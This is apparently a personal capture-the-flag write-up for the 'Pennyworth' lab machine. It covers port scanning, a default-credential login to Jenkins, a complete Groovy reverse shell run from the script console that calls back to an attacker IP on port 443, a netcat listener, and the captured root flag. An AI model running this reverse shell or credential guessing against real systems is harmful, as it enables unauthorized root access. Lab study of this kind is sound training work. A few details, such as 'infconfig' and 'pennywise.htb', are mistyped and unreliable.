@@ -1,0 +1,168 @@
+2025-02-18 13:13:31 CST -- START TIME
+### pennyworth ###
+--------------------------------------
+
+
+|================================================================
+- Name: pennyworth 
+- IP Address: 10.129.180.147 
+- OS: Ubuntu 20.04.2 LTS / 5.4.0-74-generic
+- Notes: 
+
+//CREDS:
+	Jenkins: root/password
+
+//Flag: 9cdfb439c7876e703e307864c9167a15
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// Tasks
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+#1 What does the acronym CVE stand for?
+	Common Vulnerabilities and Exposures
+
+#2 What do the three letters in CIA, referring to the CIA triad in cybersecurity, stand for?
+	Confidentiality, Integrity, Availability
+
+#3 What is the version of the service running on port 8080?
+	Jetty 9.4.39.v20210325	
+
+#4 What version of Jenkins is running on the target?
+	2.289.1
+
+#5 What type of script is accepted as input on the Jenkins Script Console?
+	Groovy	
+
+#6 What would the "String cmd" variable from the Groovy Script snippet be equal to if the Target VM was running Windows?
+	cmd.exe
+
+#7 What is a different command than "ip a" we could use to display our network interfaces' information on Linux?
+	infconfig
+
+#8 What switch should we use with netcat for it to use UDP transport mode?
+	-u
+
+#9 What is the term used to describe making a target host initiate a connection back to the attacker host?
+	Reverse Shell
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2025-02-18 13:31:02 CST -- 
+// SCAN
+ip=10.129.180.147
+ports=$(nmap -Pn -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+
+echo $ports
+//8080
+
+sudo nmap -Pn -A -p$ports $ip -oN tcp.nmap
+
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Jetty 9.4.39.v20210325
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+|_http-server-header: Jetty(9.4.39.v20210325)
+
+# UDP scan
+sudo nmap -Pn -sU --top-ports 100 $ip -oN udp.nmap
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+-- add /etc/hosts file entries --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# add /etc/hosts entry nix
+echo '10.129.180.147	pennyworth.htb' | sudo tee -a /etc/hosts
+cat /etc/hosts
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+# Web Pentesting
+
+// Web Version
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2025-02-18 13:43:33 CST -- 
+//Aggressive
+whatweb -a 3 http://pennyworth.htb:8080
+
+http://pennyworth.htb:8080 [403 Forbidden] Cookies[JSESSIONID.d00e3c20], Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.39.v20210325)], HttpOnly[JSESSIONID.d00e3c20], IP[10.129.180.147], Jenkins[2.289.1], Jetty[9.4.39.v20210325], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session]
+http://pennyworth.htb:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.d00e3c20], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(9.4.39.v20210325)], HttpOnly[JSESSIONID.d00e3c20], IP[10.129.180.147], Jenkins[2.289.1], Jetty[9.4.39.v20210325], PasswordField[j_password], Script[text/javascript], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// WebPlay
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Trying passwords (http://pennywise.htb:8080)
+//NOTE: Default password for Jenkins is admin/password
+admin:password
+admin:admin
+root:root
+root:password - WORKED
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// GroovyScript
+# http://pennyworth.htb:8080/script
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+Thread.start {
+String host="10.10.16.14";
+int port=443;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+}
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+// RevShell
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//Listener
+sudo rlwrap -cAr nc -lvnp 443
+
+2025-02-18 14:50:25 CST -- 
+//Run Groovy script above to catch a callback
+
+//Success!!!
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+-- upgrade shell --
+# python method
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+cat /root/flag.txt
+9cdfb439c7876e703e307864c9167a15 
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+//FLAG: 9cdfb439c7876e703e307864c9167a15
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+2025-02-18 15:00:54 CST -- COMPLETE
+
+
